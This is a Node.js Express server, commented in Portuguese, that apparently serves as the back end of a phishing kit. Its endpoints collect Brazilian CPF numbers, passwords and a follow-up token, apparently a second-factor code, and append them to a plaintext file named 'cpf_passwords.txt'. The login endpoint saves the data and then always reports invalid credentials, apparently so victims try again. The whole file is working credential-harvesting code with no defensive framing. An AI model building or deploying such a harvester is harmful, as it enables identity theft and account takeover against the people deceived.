const express = require('express');
const cors = require('cors');
const fs = require('fs'); 
const path = require('path'); 

const app = express();
const port = process.env.PORT || 3000;
const NOME_ARQUIVO_LOG = 'cpf_passwords.txt';

app.use(cors()); 
app.use(express.json());


app.use(express.static(path.join(__dirname, 'public')));

app.post('/salvar-dados', (req, res) => {
    const { cpf, senha } = req.body;

    if (!cpf || !senha) {
        return res.status(400).json({ message: "Dados incompletos." });
    }

    const dataHora = new Date().toLocaleString('pt-BR');
    const linhaDeLog = `[LOGIN - ${dataHora}] - CPF: ${cpf} | Senha: ${senha}\n`;

    console.log('Dados recebidos:', linhaDeLog.trim());

    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
        if (err) {
            console.error('ERRO AO SALVAR NO ARQUIVO:', err);
            return res.status(500).json({ message: 'Erro interno no servidor.' });
        }
    });


    res.status(401).json({ message: 'CPF ou senha inválidos. Tente novamente.' });
});

app.post('/acessar-contratos', (req, res) => {
    const { cpf } = req.body;

    if (!cpf) {
        return res.status(400).json({ message: "CPF é obrigatório." });
    }

    const dataHora = new Date().toLocaleString('pt-BR');
    const linhaDeLog = `[CONTRATOS - ${dataHora}] - CPF: ${cpf}\n`;

    console.log('Dados de Contratos recebidos:', linhaDeLog.trim());

    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
        if (err) {
            console.error('ERRO AO SALVAR NO ARQUIVO:', err);
            return res.status(500).json({ message: 'Erro interno no servidor.' });
        }
        console.log('CPF de Contratos salvo com sucesso em', NOME_ARQUIVO_LOG);
    });

    res.status(200).json({ message: 'Acessando seus contratos. Por favor, aguarde...' });
});

app.post('/salvar-tudo', (req, res) => {
    const { cpf, senha, token } = req.body;

    if (!cpf || !senha || !token) {
        return res.status(400).json({ message: "Dados finais incompletos." });
    }

    const dataHora = new Date().toLocaleString('pt-BR');
    const linhaDeLog = `[COMPLETO - ${dataHora}] - CPF: ${cpf} | Senha: ${senha} | Token: ${token}\n`;

    console.log('Pacote final recebido:', linhaDeLog.trim());

    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
        if (err) {
            console.error('ERRO AO SALVAR PACOTE FINAL:', err);
        }
        console.log('Pacote final salvo com sucesso em', NOME_ARQUIVO_LOG);
    });

    res.status(200).json({ message: 'Processo finalizado.' });
});


app.listen(port, () => {
    console.log(`Servidor funcional`);
    console.log(`Acesse o site no seu navegador para interagir.`);
    console.log(`Aguardando dados... tudo será exibido neste console.`);
});
